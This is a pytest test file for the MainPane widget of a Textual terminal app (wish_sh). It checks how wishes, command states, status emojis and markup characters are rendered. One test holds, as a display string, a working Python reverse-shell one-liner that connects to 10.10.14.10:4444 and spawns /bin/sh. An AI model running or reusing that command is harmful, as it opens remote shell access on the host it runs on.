"""Tests for the MainPane widget."""

import pytest
from textual.app import App, ComposeResult
from wish_models import CommandResult, CommandState, LogFiles, Wish

from wish_sh.tui.widgets.main_pane import MainPane


class MainPaneTestApp(App):
    """Test application for MainPane."""

    def compose(self) -> ComposeResult:
        """Compose the application."""
        yield MainPane(id="main-pane")


class TestMainPane:
    """Tests for the MainPane widget."""

    @pytest.mark.asyncio
    async def test_main_pane_creation(self):
        """Test that a MainPane can be created."""
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            assert pane is not None
            assert pane.id == "main-pane"
            
            # Check that the pane shows the placeholder message
            content = app.query_one("#main-pane-content")
            assert content is not None
            assert content.renderable == "(Main content will be displayed here)"

    @pytest.mark.asyncio
    async def test_main_pane_update_wish_none(self):
        """Test that a MainPane can be updated with no wish."""
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # Update with no wish
            pane.update_wish(None)
            
            # Check that the pane shows the "No wish selected" message
            content = app.query_one("#main-pane-content")
            assert content is not None
            assert content.renderable == "(No wish selected)"

    @pytest.mark.asyncio
    async def test_main_pane_update_wish(self):
        """Test that a MainPane can be updated with a wish."""
        # Create a test wish
        test_wish = Wish.create("Test wish")
        
        # Add a command result
        log_files = LogFiles(stdout="stdout.log", stderr="stderr.log")
        cmd_result = CommandResult.create(1, "echo 'Hello, world!'", log_files)
        cmd_result.state = CommandState.SUCCESS
        test_wish.command_results.append(cmd_result)
        
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # Update with the test wish
            pane.update_wish(test_wish)
            
            # Check that the pane shows the wish details
            content = app.query_one("#main-pane-content")
            assert content is not None
            assert "[b]Wish:[/b]" in content.renderable
            assert "Test wish" in content.renderable
            assert "[b]Status:[/b]" in content.renderable
            assert "[b]Created:[/b]" in content.renderable
            assert "[b]Finished:[/b]" in content.renderable
            assert "[b]Commands:[/b]" in content.renderable
            assert "✅" in content.renderable  # Success emoji
            assert "echo 'Hello, world!'" in content.renderable

    @pytest.mark.asyncio
    async def test_main_pane_update_wish_with_multiple_commands(self):
        """Test that a MainPane can be updated with a wish that has multiple commands."""
        # Create a test wish
        test_wish = Wish.create("Test wish with multiple commands")
        
        # Add command results with different states
        log_files = LogFiles(stdout="stdout.log", stderr="stderr.log")
        
        cmd1 = CommandResult.create(1, "echo 'Command 1'", log_files)
        cmd1.state = CommandState.SUCCESS
        test_wish.command_results.append(cmd1)
        
        cmd2 = CommandResult.create(2, "echo 'Command 2'", log_files)
        cmd2.state = CommandState.OTHERS  # Failed
        test_wish.command_results.append(cmd2)
        
        cmd3 = CommandResult.create(3, "echo 'Command 3'", log_files)
        cmd3.state = None  # Still running
        test_wish.command_results.append(cmd3)
        
        cmd4 = CommandResult.create(4, "echo 'Command 4'", log_files)
        cmd4.state = CommandState.USER_CANCELLED
        test_wish.command_results.append(cmd4)
        
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # Update with the test wish
            pane.update_wish(test_wish)
            
            # Check that the pane shows the wish details
            content = app.query_one("#main-pane-content")
            assert content is not None
            assert "[b]Wish:[/b]" in content.renderable
            assert "Test wish with multiple commands" in content.renderable
            
            # Check that all commands are displayed with their correct status and emojis
            assert "echo 'Command 1'" in content.renderable
            assert "✅" in content.renderable  # Success emoji
            
            assert "echo 'Command 2'" in content.renderable
            assert "❌" in content.renderable  # Failed emoji
            
            assert "echo 'Command 3'" in content.renderable
            assert "❓" in content.renderable  # Unknown state emoji
            
            assert "echo 'Command 4'" in content.renderable
            assert "🚫" in content.renderable  # Cancelled emoji

    @pytest.mark.asyncio
    async def test_main_pane_update_for_new_wish_mode(self):
        """Test that a MainPane can be updated for New Wish mode."""
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # Update for New Wish mode
            pane.update_for_new_wish_mode()
            
            # Check that the content has been updated
            content = app.query_one("#main-pane-content")
            assert content is not None
            assert "新しいWishを作成するモードです" in content.renderable
    
    @pytest.mark.asyncio
    async def test_main_pane_content_update_on_wish_mode_switch(self):
        """Test that the MainPane content is updated correctly when switching modes."""
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # First update for New Wish mode
            pane.update_for_new_wish_mode()
            content = app.query_one("#main-pane-content")
            assert "新しいWishを作成するモードです" in content.renderable
            
            # Then update with a wish (Wish History mode)
            test_wish = Wish.create("Test wish")
            pane.update_wish(test_wish)
            
            # Check that the content has been updated
            content = app.query_one("#main-pane-content")
            assert "[b]Wish:[/b]" in content.renderable
            assert "Test wish" in content.renderable
    
    @pytest.mark.asyncio
    async def test_main_pane_active_state(self):
        """Test that a MainPane can be set to active."""
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # Initially not active
            assert "active-pane" not in pane.classes
            
            # Set to active
            pane.set_active(True)
            assert "active-pane" in pane.classes
            
            # Set to inactive
            pane.set_active(False)
            assert "active-pane" not in pane.classes
    
    @pytest.mark.asyncio
    async def test_main_pane_with_markup_characters(self):
        """Test that a MainPane can handle wish and commands with markup characters."""
        # Create a test wish with markup characters
        test_wish = Wish.create("Test wish with [markup] characters")
        
        # Add command results with markup characters
        log_files = LogFiles(stdout="stdout.log", stderr="stderr.log")
        
        cmd1 = CommandResult.create(1, "echo '[bold]Hello[/bold]'", log_files)
        cmd1.state = CommandState.SUCCESS
        test_wish.command_results.append(cmd1)
        
        cmd2 = CommandResult.create(2, "grep -r \"[text]\" *.py", log_files)
        cmd2.state = CommandState.SUCCESS
        test_wish.command_results.append(cmd2)
        
        cmd3 = CommandResult.create(3, "python -c \"import os; print('[DEBUG]')\"", log_files)
        cmd3.state = CommandState.SUCCESS
        test_wish.command_results.append(cmd3)
        
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # Update with the test wish
            pane.update_wish(test_wish)
            
            # Check that the content widget has markup disabled
            content = app.query_one("#main-pane-content")
            assert content is not None
            assert content.markup is False
            
            # Check that the wish with markup characters is displayed correctly
            rendered_text = content.renderable
            assert "Test wish with [markup] characters" in rendered_text
            
            # Check that commands with markup characters are displayed correctly
            # The special characters should be replaced with safer alternatives
            assert "echo '[bold]Hello[/bold]'" in rendered_text or "echo '【bold】Hello【/bold】'" in rendered_text
            assert "grep -r \"[text]\" *.py" in rendered_text or "grep -r '【text】' *.py" in rendered_text
            assert "python -c \"import os; print('[DEBUG]')\"" in rendered_text or "python -c 'import os; print('【DEBUG】')'" in rendered_text
    
    @pytest.mark.asyncio
    async def test_main_pane_with_problematic_command(self):
        """Test that a MainPane can handle commands with problematic characters."""
        # Create a test wish
        test_wish = Wish.create("Test wish with problematic command")
        
        # Add a command with problematic characters (similar to the helloooo wish)
        problematic_cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
        log_files = LogFiles(stdout="stdout.log", stderr="stderr.log")
        cmd = CommandResult.create(1, problematic_cmd, log_files)
        cmd.state = CommandState.NETWORK_ERROR
        test_wish.command_results.append(cmd)
        
        app = MainPaneTestApp()
        async with app.run_test():
            pane = app.query_one(MainPane)
            
            # Update with the test wish
            pane.update_wish(test_wish)
            
            # Check that the content widget has markup disabled
            content = app.query_one("#main-pane-content")
            assert content is not None
            assert content.markup is False
            
            # The command should be displayed without causing errors
            # We don't check the exact text because the character replacement might vary,
            # but we ensure that the command is displayed in some form
            rendered_text = content.renderable
            assert "Test wish with problematic command" in rendered_text
            assert "python3 -c" in rendered_text
            assert "📡❌" in rendered_text  # Network error emoji
